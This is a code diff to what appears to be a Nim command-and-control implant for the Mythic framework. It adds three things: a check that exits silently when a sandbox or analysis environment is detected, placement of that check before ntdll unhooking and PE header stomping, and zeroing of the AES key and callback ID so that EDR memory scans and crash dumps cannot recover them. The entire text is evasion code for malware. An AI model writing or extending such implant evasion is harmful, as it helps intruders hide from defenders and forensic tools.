@@ -6,6 +6,7 @@ when defined(windows) and defined(unhookNtdll):
   import core/unhook
 when defined(windows) and defined(peStamp):
   import core/pestamp
+import core/sandbox
 
 when defined(c2ProfileWs):
   import transport/websocket
@@ -468,8 +469,10 @@ proc collectSocksOut(): seq[JsonNode] =
 # ---------------------------------------------------------------------------
 
 proc run*(ag: AphroditeAgent) =
-  # Stealth initializers: ntdll unhooking and PE header stomping run before
-  # any network activity so hooks are bypassed from the first beacon.
+  # Stealth initializers: sandbox check, ntdll unhooking, PE header stomping
+  # run before any network activity.
+  if isSandbox(): return   # silent exit if analysis environment detected
+
   when defined(windows) and defined(unhookNtdll):
     discard unhookNtdll()
   when defined(windows) and defined(peStamp):
@@ -544,3 +547,10 @@ proc run*(ag: AphroditeAgent) =
     pendingSocks.add(socksIn)
 
     ag.sleepWithJitter()
+
+  # Secure wipe: zero AES key and callback ID so they cannot be recovered from
+  # a post-exit memory dump (e.g., crash dump, EDR memory scan at shutdown).
+  if ag.aesKey.len > 0:
+    zeroMem(addr ag.aesKey[0], ag.aesKey.len)
+  for i in 0 ..< ag.mythicID.len:
+    ag.mythicID[i] = '\x00'
